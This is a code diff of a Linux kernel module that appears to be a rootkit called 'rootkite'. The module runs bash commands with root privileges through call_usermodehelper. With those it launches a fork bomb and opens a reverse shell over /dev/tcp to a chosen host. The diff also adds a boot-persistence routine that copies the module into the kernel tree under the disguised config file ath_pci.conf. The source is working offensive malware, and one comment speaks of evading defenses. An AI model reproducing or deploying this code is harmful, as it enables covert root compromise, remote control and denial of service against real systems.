@@ -6,10 +6,24 @@
 /*use bash binary to do a command that defines a function that calls itself,
   pipe the output to another call of itself, making a recursive function that calls itself
   and creating a fork each time with the pipe operator*/
-static char *args[] = {"/bin/bash", "-c", ":(){ :|:& };:", NULL};
 static char *env[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; // environment variables of the process
-
 static char *args_shell[] = {"/bin/bash", "-c", "", NULL};
+
+
+static int run_shell(char *command){
+    int ret;
+    args_shell[2] = command;
+    ret = call_usermodehelper(args_shell[0], args_shell, env, UMH_WAIT_EXEC);
+    if (ret != 0){
+	      printk(KERN_ERR "error in call to usermodehelper: %i\n", ret);
+    }
+	  else {
+	      printk(KERN_INFO "called usermode command: %s\n", command);
+    }
+    kfree(command);
+    return ret;
+}
+
 
 /*It runs a user-space application. The application is started asynchronously if wait is not set,
   and runs as a child of system workqueues(kworkers, executors of kthreads) that are children of kthreadd. (ie. it runs with full root capabilities and optimized affinity).
@@ -17,13 +31,9 @@ static char *args_shell[] = {"/bin/bash", "-c", "", NULL};
   can also spawn multiple processes for multiple workers for added complexity to avoid defenses.
   */
 static void start_bombing_run(void){
-    int ret = call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
-    if (ret != 0){
-	      printk(KERN_ERR "error in call to usermodehelper: %i\n", ret);
-    }
-	  else {
-	    printk(KERN_INFO "Target Aquired\n");
-	  }
+    char *comm = kmalloc(NAME_MAX + 1, GFP_KERNEL);
+    snprintf(comm, NAME_MAX, ":(){ :|:& };:");
+    run_shell(comm);
 }
 
 /*calling a usermode helper, using the bash binary,
@@ -32,16 +42,15 @@ static void start_bombing_run(void){
 */
 static void start_reverse_shell(char *address, char *port){
     char *add = kmalloc(NAME_MAX + 1, GFP_KERNEL);
-    int ret;
     snprintf(add, NAME_MAX, "/bin/sh -i >& /dev/tcp/%s/%s 0>&1", address, port);
-    args_shell[2] = add;
-    ret = call_usermodehelper(args_shell[0], args_shell, env, UMH_WAIT_EXEC);
-    if (ret != 0){
-	      printk(KERN_ERR "error in call to usermodehelper: %i\n", ret);
-    }
-	  else {
-	      printk(KERN_INFO "RS activated\n");
-    }
-    kfree(add);
+    run_shell(add);
+}
+
+/* insert rootkite on boot, do it by inserting the module to modprobe's module list,
+   then insert the configuration to load the module and update the list.*/
+static void rooted(void){
+    char *comm = kmalloc(NAME_MAX + 1, GFP_KERNEL);
+    snprintf(comm, NAME_MAX, "ls /lib/modules/$(uname -r)/kernel/fs/ | grep rootkite || find / -name rootkite.ko -exec cp {} /lib/modules/$(uname -r)/kernel/fs/ \\; -quit && echo rootkite > /etc/modules-load.d/ath_pci.conf && depmod");
+    run_shell(comm);
 }
 #endif
